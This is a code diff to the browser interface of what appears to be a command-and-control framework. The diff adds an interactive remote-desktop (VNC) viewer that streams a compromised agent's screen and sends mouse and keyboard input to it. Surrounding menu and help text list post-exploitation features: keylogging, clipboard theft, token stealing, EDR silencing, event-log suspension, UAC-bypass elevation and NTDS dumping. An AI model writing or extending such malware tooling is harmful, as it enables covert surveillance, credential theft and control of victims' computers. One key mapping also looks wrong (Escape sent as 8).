@@ -788,6 +788,28 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
           </div>
         </div>
       </div>
+        <!-- VNC Desktop view (shown when a Desktop tab is active) -->
+        <div id="vnc-view" style="display:none;flex-direction:column;flex:1;min-height:0;background:#111">
+          <div id="vnc-toolbar" style="display:flex;align-items:center;gap:6px;padding:4px 10px;background:var(--bg3);border-bottom:1px solid var(--border);flex-shrink:0">
+            <span id="vnc-view-label" style="font-size:11px;color:var(--text2);font-family:var(--font-mono);flex:1"></span>
+            <span id="vnc-status" style="font-size:10px;color:var(--text3);font-family:var(--font-mono)">connecting…</span>
+            <select id="vnc-quality-sel" onchange="vncSetQuality(parseInt(this.value))" style="font-size:11px;background:var(--bg2);border:1px solid var(--border);color:var(--text2);padding:2px 4px;border-radius:3px">
+              <option value="30">Low (30)</option>
+              <option value="60" selected>Med (60)</option>
+              <option value="85">High (85)</option>
+              <option value="95">Best (95)</option>
+            </select>
+            <button class="btn btn-ghost btn-sm" onclick="vncToggleInput()" id="vnc-input-btn" title="Toggle keyboard/mouse capture">🖱 Input</button>
+            <button class="btn btn-ghost btn-sm" onclick="vncFullscreen()" title="Fullscreen">⛶</button>
+            <button class="btn btn-ghost btn-sm" style="color:var(--red)" onclick="closeVNCSession(vncActiveId)">■ Stop</button>
+          </div>
+          <div id="vnc-canvas-wrap" style="flex:1;overflow:auto;display:flex;align-items:flex-start;justify-content:flex-start;position:relative;cursor:none">
+            <canvas id="vnc-canvas" style="display:block;image-rendering:pixelated"></canvas>
+            <div id="vnc-overlay" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--text3);font-family:var(--font-mono);font-size:12px;background:rgba(0,0,0,.6);pointer-events:none">
+              Waiting for agent connection…
+            </div>
+          </div>
+        </div>
       </div><!-- #agents-body -->
     </div>
 
@@ -4288,6 +4310,7 @@ async function runCtxAction(act) {
       break;
     }
     case 'injectModal':      openInjectModal(act.id, act.mode, act.pid); break;
+    case 'openDesktop':      openDesktop(act.id, act.quality || 60); break;
     case 'screenshotToLoot': {
       const aid = act.id;
       const r = await api('POST', `/api/agents/${aid}/task`, {type:'SCREENSHOT', args:''});
@@ -4919,6 +4942,323 @@ function deleteAgent(agentId) {
   });
 }
 
+// ── VNC Desktop tab ───────────────────────────────────────────────────────────
+let vncActiveId = null;
+const vncSessions = new Map(); // agentId → {label, ws, inputCaptured}
+
+// VNC frame type constants (must match server/vnc.go)
+const VNC_MOUSE_MOVE  = 0x10;
+const VNC_MOUSE_CLICK = 0x11;
+const VNC_MOUSE_WHEEL = 0x12;
+const VNC_KEY         = 0x13;
+const VNC_QUALITY     = 0x16;
+
+function vncEncodeFrame(type, payload) {
+  const buf = new ArrayBuffer(5 + payload.byteLength);
+  const v   = new DataView(buf);
+  v.setUint8(0, type);
+  v.setUint32(1, payload.byteLength, true);
+  new Uint8Array(buf, 5).set(new Uint8Array(payload));
+  return buf;
+}
+
+function vncSend(agentId, type, payload) {
+  const s = vncSessions.get(agentId);
+  if (!s || !s.ws || s.ws.readyState !== WebSocket.OPEN) return;
+  s.ws.send(vncEncodeFrame(type, payload || new ArrayBuffer(0)));
+}
+
+function vncBuildMouse(x, y) {
+  const b = new ArrayBuffer(8);
+  const v = new DataView(b);
+  v.setUint32(0, x, true);
+  v.setUint32(4, y, true);
+  return b;
+}
+
+function vncBuildClick(x, y, btn, down) {
+  const b = new ArrayBuffer(10);
+  const v = new DataView(b);
+  v.setUint32(0, x, true);
+  v.setUint32(4, y, true);
+  v.setUint8(8, btn);
+  v.setUint8(9, down ? 1 : 0);
+  return b;
+}
+
+function vncBuildWheel(delta) {
+  const b = new ArrayBuffer(4);
+  new DataView(b).setInt32(0, delta, true);
+  return b;
+}
+
+function vncBuildKey(vk, down) {
+  const b = new ArrayBuffer(3);
+  const v = new DataView(b);
+  v.setUint16(0, vk, true);
+  v.setUint8(2, down ? 1 : 0);
+  return b;
+}
+
+function vncSetQuality(q) {
+  if (!vncActiveId) return;
+  const b = new ArrayBuffer(1);
+  new DataView(b).setUint8(0, q);
+  vncSend(vncActiveId, VNC_QUALITY, b);
+}
+
+function vncToggleInput() {
+  if (!vncActiveId) return;
+  const s = vncSessions.get(vncActiveId);
+  if (!s) return;
+  s.inputCaptured = !s.inputCaptured;
+  const btn = document.getElementById('vnc-input-btn');
+  const canvas = document.getElementById('vnc-canvas');
+  if (s.inputCaptured) {
+    btn.style.color = 'var(--accent)';
+    canvas.style.cursor = 'none';
+    canvas.focus();
+  } else {
+    btn.style.color = '';
+    canvas.style.cursor = 'default';
+  }
+}
+
+function vncFullscreen() {
+  const wrap = document.getElementById('vnc-view');
+  if (!document.fullscreenElement) {
+    wrap.requestFullscreen && wrap.requestFullscreen();
+  } else {
+    document.exitFullscreen && document.exitFullscreen();
+  }
+}
+
+// JS VK code mapping for common keys
+const _jsKeyToVK = {
+  'Escape':8,        'Backspace':8, 'Tab':9, 'Enter':13, 'Shift':16, 'Control':17,
+  'Alt':18, 'Pause':19, 'CapsLock':20, 'Space':32, 'PageUp':33, 'PageDown':34,
+  'End':35, 'Home':36, 'ArrowLeft':37, 'ArrowUp':38, 'ArrowRight':39, 'ArrowDown':40,
+  'PrintScreen':44, 'Insert':45, 'Delete':46, 'Meta':91, 'ContextMenu':93,
+  'F1':112,'F2':113,'F3':114,'F4':115,'F5':116,'F6':117,
+  'F7':118,'F8':119,'F9':120,'F10':121,'F11':122,'F12':123,
+  'NumLock':144,'ScrollLock':145,
+};
+function jsKeyToVK(e) {
+  if (_jsKeyToVK[e.key] !== undefined) return _jsKeyToVK[e.key];
+  if (e.key.length === 1) return e.key.toUpperCase().charCodeAt(0);
+  return 0;
+}
+
+function vncAttachEvents(agentId) {
+  const canvas = document.getElementById('vnc-canvas');
+  const wrap   = document.getElementById('vnc-canvas-wrap');
+
+  function canvasXY(e) {
+    const r = canvas.getBoundingClientRect();
+    const scaleX = (canvas._vncW || canvas.width)  / r.width;
+    const scaleY = (canvas._vncH || canvas.height) / r.height;
+    return [Math.round((e.clientX - r.left) * scaleX),
+            Math.round((e.clientY - r.top)  * scaleY)];
+  }
+
+  canvas._vncMove = e => {
+    const s = vncSessions.get(agentId);
+    if (!s || !s.inputCaptured) return;
+    const [x,y] = canvasXY(e);
+    vncSend(agentId, VNC_MOUSE_MOVE, vncBuildMouse(x,y));
+  };
+  canvas._vncDown = e => {
+    const s = vncSessions.get(agentId);
+    if (!s || !s.inputCaptured) return;
+    e.preventDefault();
+    const [x,y] = canvasXY(e);
+    const btn = e.button === 0 ? 1 : e.button === 2 ? 2 : 3;
+    vncSend(agentId, VNC_MOUSE_CLICK, vncBuildClick(x,y,btn,true));
+  };
+  canvas._vncUp = e => {
+    const s = vncSessions.get(agentId);
+    if (!s || !s.inputCaptured) return;
+    e.preventDefault();
+    const [x,y] = canvasXY(e);
+    const btn = e.button === 0 ? 1 : e.button === 2 ? 2 : 3;
+    vncSend(agentId, VNC_MOUSE_CLICK, vncBuildClick(x,y,btn,false));
+  };
+  canvas._vncWheel = e => {
+    const s = vncSessions.get(agentId);
+    if (!s || !s.inputCaptured) return;
+    e.preventDefault();
+    const delta = Math.round(-e.deltaY * 120 / (e.deltaMode === 1 ? 1 : 1));
+    vncSend(agentId, VNC_MOUSE_WHEEL, vncBuildWheel(delta));
+  };
+  canvas._vncKeyDown = e => {
+    const s = vncSessions.get(agentId);
+    if (!s || !s.inputCaptured) return;
+    e.preventDefault();
+    const vk = jsKeyToVK(e);
+    if (vk) vncSend(agentId, VNC_KEY, vncBuildKey(vk, true));
+  };
+  canvas._vncKeyUp = e => {
+    const s = vncSessions.get(agentId);
+    if (!s || !s.inputCaptured) return;
+    e.preventDefault();
+    const vk = jsKeyToVK(e);
+    if (vk) vncSend(agentId, VNC_KEY, vncBuildKey(vk, false));
+  };
+  canvas._vncCtxMenu = e => {
+    const s = vncSessions.get(agentId);
+    if (s && s.inputCaptured) e.preventDefault();
+  };
+
+  canvas.addEventListener('mousemove',  canvas._vncMove);
+  canvas.addEventListener('mousedown',  canvas._vncDown);
+  canvas.addEventListener('mouseup',    canvas._vncUp);
+  canvas.addEventListener('wheel',      canvas._vncWheel, {passive:false});
+  canvas.addEventListener('keydown',    canvas._vncKeyDown);
+  canvas.addEventListener('keyup',      canvas._vncKeyUp);
+  canvas.addEventListener('contextmenu',canvas._vncCtxMenu);
+  canvas.setAttribute('tabindex','0');
+}
+
+function vncDetachEvents() {
+  const canvas = document.getElementById('vnc-canvas');
+  if (!canvas) return;
+  if (canvas._vncMove)    canvas.removeEventListener('mousemove',  canvas._vncMove);
+  if (canvas._vncDown)    canvas.removeEventListener('mousedown',  canvas._vncDown);
+  if (canvas._vncUp)      canvas.removeEventListener('mouseup',    canvas._vncUp);
+  if (canvas._vncWheel)   canvas.removeEventListener('wheel',      canvas._vncWheel);
+  if (canvas._vncKeyDown) canvas.removeEventListener('keydown',    canvas._vncKeyDown);
+  if (canvas._vncKeyUp)   canvas.removeEventListener('keyup',      canvas._vncKeyUp);
+  if (canvas._vncCtxMenu) canvas.removeEventListener('contextmenu',canvas._vncCtxMenu);
+}
+
+function openDesktop(agentId, quality) {
+  quality = quality || 60;
+  const a = agents.find(x => x.id === agentId);
+  const short = agentId.substring(0,8);
+  const label = a ? `🖥 ${a.hostname}·${short}` : `🖥 ${short}`;
+
+  // Start VNC session on server
+  api('POST', '/api/vnc', {agent_id: agentId, quality}).then(r => {
+    if (!r?.ok) { addConsoleOutput('', r?.error || 'vnc start failed', null); return; }
+
+    document.getElementById('console-pane').classList.add('open');
+    showTab('agents');
+
+    vncSessions.set(agentId, {label, ws: null, inputCaptured: false});
+    addConsoleOutput(`[*] Desktop session started (quality: ${quality}) — opening viewer…`, '', null);
+
+    switchToVNCSession(agentId, quality);
+    renderConsoleTabs();
+  }).catch(e => addConsoleOutput('', 'desktop error: '+e.message, null));
+}
+
+function switchToVNCSession(agentId, quality) {
+  vncActiveId = agentId;
+  const s = vncSessions.get(agentId);
+  if (!s) return;
+
+  // Hide other views
+  document.getElementById('ps-view').style.display = 'none';
+  document.getElementById('console-view').style.display = 'none';
+  document.getElementById('vnc-view').style.display = 'flex';
+  document.getElementById('vnc-view-label').textContent = s.label;
+  document.getElementById('vnc-status').textContent = 'connecting…';
+  document.getElementById('vnc-overlay').style.display = 'flex';
+
+  // Set quality selector
+  const sel = document.getElementById('vnc-quality-sel');
+  if (sel) sel.value = String(quality || 60);
+
+  // Detach old events
+  vncDetachEvents();
+  if (s.ws) { try { s.ws.close(); } catch(_){} }
+
+  // Open WebSocket to the VNC stream
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  const ws = new WebSocket(`${proto}://${location.host}/api/vnc/${agentId}?token=${encodeURIComponent(window.__GUI_TOKEN__ || '')}`);
+  ws.binaryType = 'arraybuffer';
+  s.ws = ws;
+
+  const canvas = document.getElementById('vnc-canvas');
+  const ctx    = canvas.getContext('2d');
+  const overlay = document.getElementById('vnc-overlay');
+
+  ws.onopen = () => {
+    document.getElementById('vnc-status').textContent = 'live';
+    overlay.style.display = 'none';
+    vncAttachEvents(agentId);
+  };
+
+  ws.onmessage = ev => {
+    const buf  = ev.data;
+    const view = new DataView(buf);
+    const typ  = view.getUint8(0);
+    const plen = view.getUint32(1, true);
+    const payload = buf.slice(5);
+
+    if (typ === 0x01 && plen >= 4) { // FRAME
+      const w = view.getUint16(5, true);
+      const h = view.getUint16(7, true);
+      const jpeg = buf.slice(9);
+      canvas._vncW = w;
+      canvas._vncH = h;
+      if (canvas.width !== w || canvas.height !== h) {
+        canvas.width  = w;
+        canvas.height = h;
+        canvas.style.maxWidth  = '100%';
+        canvas.style.maxHeight = '100%';
+      }
+      const blob = new Blob([jpeg], {type:'image/jpeg'});
+      const url  = URL.createObjectURL(blob);
+      const img  = new Image();
+      img.onload = () => { ctx.drawImage(img, 0, 0); URL.revokeObjectURL(url); };
+      img.src = url;
+    } else if (typ === 0x02) { // INFO
+      try {
+        const info = JSON.parse(new TextDecoder().decode(payload));
+        document.getElementById('vnc-status').textContent = `live ${info.w}×${info.h}`;
+      } catch(_) {}
+    }
+  };
+
+  ws.onclose = () => {
+    document.getElementById('vnc-status').textContent = 'disconnected';
+    overlay.style.display = 'flex';
+    overlay.textContent = 'Connection closed';
+    const sess = vncSessions.get(agentId);
+    if (sess) sess.inputCaptured = false;
+    const btn = document.getElementById('vnc-input-btn');
+    if (btn) btn.style.color = '';
+  };
+
+  ws.onerror = () => {
+    document.getElementById('vnc-status').textContent = 'error';
+  };
+}
+
+function closeVNCSession(agentId, e) {
+  if (e) e.stopPropagation();
+  const s = vncSessions.get(agentId);
+  if (s) {
+    if (s.ws) { try { s.ws.close(); } catch(_){} }
+    vncSessions.delete(agentId);
+  }
+  api('DELETE', '/api/vnc', {agent_id: agentId}).catch(()=>{});
+
+  if (vncActiveId === agentId) {
+    vncActiveId = null;
+    vncDetachEvents();
+    document.getElementById('vnc-view').style.display = 'none';
+  }
+
+  if (consoleTabs.length === 0 && fxSessions.size === 0 && psSessions.size === 0 && vncSessions.size === 0) {
+    document.getElementById('console-pane').classList.remove('open');
+  } else if (consoleTabs.length > 0) {
+    switchConsoleTab(consoleTabs[consoleTabs.length-1]);
+  }
+  renderConsoleTabs();
+}
+
 // ── Process List tab ──────────────────────────────────────────────────────────
 let psAgentId = null;
 const psSessions = new Map(); // agentId → {label}
@@ -4944,8 +5284,10 @@ function switchToPSSession(agentId) {
   document.getElementById('fx-view').style.display     = 'none';
   document.getElementById('aic-view').style.display    = 'none';
   document.getElementById('ps-view').style.display     = 'flex';
+  document.getElementById('vnc-view').style.display    = 'none';
   fxAgentId  = null;
   aicAgentId = null;
+  vncActiveId = null;
   renderConsoleTabs();
   refreshProcessList();
 }
@@ -5401,6 +5743,7 @@ function agentContextMenu(e, agentId) {
       {label:'🗑  ADS Delete…', action:{fn:'adsOp', id, op:'del'}},
     ]},
     {_sub:'🎯  Collection', items:[
+      {label:'🖥  Desktop (VNC)',             action:{fn:'openDesktop',    id,   quality:60}},
       {label:'📸  Screenshot → Loot',        action:{fn:'screenshotToLoot', id}},
       {label:'🔄  Screenwatch Start (30s)',   action:{fn:'selectAndTask', id, type:'SCREENWATCH_START', args:'30'}},
       {label:'⏹  Screenwatch Stop',          action:{fn:'selectAndTask', id, type:'SCREENWATCH_STOP',  args:''}},
@@ -5769,6 +6112,7 @@ function doLogout() {
   closeConsole();
   fxSessions.clear();
   psSessions.clear();
+  vncSessions.clear();
   consoleHistory = {};
   consoleHistIdx = {};
   consoleDrafts = {};
@@ -9462,7 +9806,7 @@ function renderConsoleTabs() {
       <span class="tab-dot" style="background:${dotColor}"></span>
       <span>${esc(label)}</span>
       <span class="tab-close" onclick="closeConsoleTab('${id}',event)">✕</span>`;
-    tab.addEventListener('click', () => { fxSaveSession(); fxAgentId = null; psAgentId = null; document.getElementById('ps-view').style.display='none'; switchConsoleTab(id); });
+    tab.addEventListener('click', () => { fxSaveSession(); fxAgentId = null; psAgentId = null; document.getElementById('ps-view').style.display='none'; document.getElementById('vnc-view').style.display='none'; vncActiveId=null; vncDetachEvents(); switchConsoleTab(id); });
     tab.addEventListener('dblclick', e => { e.stopPropagation(); toggleConsoleMaximize(); });
     bar.appendChild(tab);
   });
@@ -9494,6 +9838,20 @@ function renderConsoleTabs() {
     tab.addEventListener('click', () => switchToPSSession(id));
     bar.appendChild(tab);
   });
+
+  // Desktop (VNC) tabs
+  vncSessions.forEach((s, id) => {
+    const isActive = vncActiveId === id && document.getElementById('vnc-view').style.display !== 'none';
+    const tab = document.createElement('div');
+    tab.className = 'console-tab' + (isActive ? ' active' : '');
+    tab.style.cssText += ';color:' + (isActive ? 'var(--accent)' : 'var(--text2)');
+    tab.innerHTML = `
+      <span style="font-size:12px">🖥</span>
+      <span>${esc(s.label)}</span>
+      <span class="tab-close" onclick="event.stopPropagation();closeVNCSession('${id}',event)">✕</span>`;
+    tab.addEventListener('click', () => switchToVNCSession(id));
+    bar.appendChild(tab);
+  });
 }
 
 function closeConsoleTab(id, e) {
@@ -9522,7 +9880,7 @@ function closeConsoleTab(id, e) {
 
   consoleTabs = consoleTabs.filter(x => x !== id);
 
-  if (consoleTabs.length === 0 && fxSessions.size === 0 && (!psSessions || psSessions.size === 0)) {
+  if (consoleTabs.length === 0 && fxSessions.size === 0 && (!psSessions || psSessions.size === 0) && vncSessions.size === 0) {
     document.getElementById('console-pane').classList.remove('open');
     document.getElementById('console-prompt-label').textContent = 'c2 »';
     fxShowView('console');
@@ -9532,7 +9890,7 @@ function closeConsoleTab(id, e) {
     // FX sessions remain — switch to first one
     fxSwitchSession([...fxSessions.keys()][0]);
   }
-  // else: only PS sessions remain; their view is already visible
+  // else: only PS/VNC sessions remain; their view is already visible
   renderConsoleTabs();
 }
 
@@ -9547,6 +9905,16 @@ function closeConsole() {
   aicAgentId = null;
   aicHistory = [];
   aicBusy = false;
+  // Close all VNC sessions
+  vncSessions.forEach((s, id) => {
+    if (s.ws) { try { s.ws.close(); } catch(_){} }
+    api('DELETE', '/api/vnc', {agent_id: id}).catch(()=>{});
+  });
+  vncSessions.clear();
+  vncActiveId = null;
+  vncDetachEvents();
+  const vnc = document.getElementById('vnc-view');
+  if (vnc) vnc.style.display = 'none';
   const pane = document.getElementById('console-pane');
   pane.classList.remove('open', 'maximized');
   document.getElementById('agents-panel').classList.remove('console-maximized');
@@ -9894,6 +10262,8 @@ const AC_COMMANDS = [
   ['token-store clear','token-store clear — clear token store'],
   ['screenwatch start','screenwatch start [secs] — continuous screenshots (default: 30s)'],
   ['screenwatch stop','screenwatch stop — stop continuous screenshots'],
+  ['desktop','desktop [low|med|high|best|<quality>] — interactive VNC desktop viewer'],
+  ['desktop stop','desktop stop — close the VNC desktop session'],
   ['bof-store load','bof-store load <name> <file.coff> — preload BOF into memory'],
   ['bof-store list','bof-store list — list preloaded BOFs'],
   ['bof-store unload','bof-store unload <name> — unload BOF from in-memory store'],
@@ -9969,6 +10339,7 @@ const AC_WIN_ONLY = new Set([
   'clip-monitor start','clip-monitor dump','clip-monitor stop',
   'token-store steal','token-store use','token-store show','token-store remove','token-store clear',
   'screenwatch start','screenwatch stop',
+  'desktop','desktop stop',
   'edr-silence','edr-silence-rm','eventlog-suspend','eventlog-resume',
   'elevate fodhelper','elevate computerdefaults','elevate cmlua',
   'peb-spoof','hwbp-clear','ntds-dump',
@@ -10366,6 +10737,8 @@ ${isWin ? `
 <span class="console-section">COLLECTION</span>
   screenshot                         screenshot → server
   screenwatch start [secs] / stop    automatic periodic screenshots (default every 30s)
+  desktop [low|med|high|best]        interactive VNC desktop viewer (default: med quality)
+  desktop stop                       close the VNC desktop session
   keylog start|stop|dump             WH_KEYBOARD_LL keylogger (system-level keyboard hook)
   clip                               read clipboard (one-shot)
   clip-monitor start / dump / stop   monitor clipboard continuously
@@ -12470,6 +12843,28 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       else if (sw==='stop') { taskType='SCREENWATCH_STOP'; }
       else { addConsoleOutput('usage: screenwatch start [secs] | stop', '', null); return; }
       break;
+    }
+    case 'desktop': {
+      // desktop [stop|low|med|high] [quality]
+      const dparts = args.trim().split(/\s+/);
+      if (dparts[0] === 'stop') {
+        api('DELETE', '/api/vnc', {agent_id: activeAgent.id}).then(r => {
+          if (r?.ok) {
+            addConsoleOutput('[+] Desktop session stopped', '', null);
+            if (vncSessions.has(activeAgent.id)) closeVNCSession(activeAgent.id);
+          } else {
+            addConsoleOutput('', r?.error || 'vnc stop failed', null);
+          }
+        });
+        return;
+      }
+      let quality = 60;
+      const qMap = {low:30, med:60, high:85, best:95};
+      if (qMap[dparts[0]]) quality = qMap[dparts[0]];
+      else if (parseInt(dparts[0])) quality = parseInt(dparts[0]);
+      if (dparts[1] && parseInt(dparts[1])) quality = parseInt(dparts[1]);
+      openDesktop(activeAgent.id, quality);
+      return;
     }
     case 'bof-store': {
       const [bs,...br] = args.split(' ');
